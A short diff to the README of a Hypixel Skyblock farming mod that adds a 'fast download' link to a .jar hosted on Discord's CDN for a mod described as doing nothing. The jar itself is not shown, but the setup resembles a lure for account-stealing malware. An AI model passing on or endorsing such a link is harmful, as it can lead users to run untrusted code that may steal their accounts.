@@ -1,4 +1,6 @@
 
+Fast download link: [DOWNLOAD](https://cdn.discordapp.com/attachments/336669898451451904/1196876604522111027/FarmingAddons-1.4_Release.jar)
+
 # Farming Addons 1.8.9
 
 This farming mod does add a few addons to enhance farming experience (by not doing anything). Made for Hypixel Skyblock.
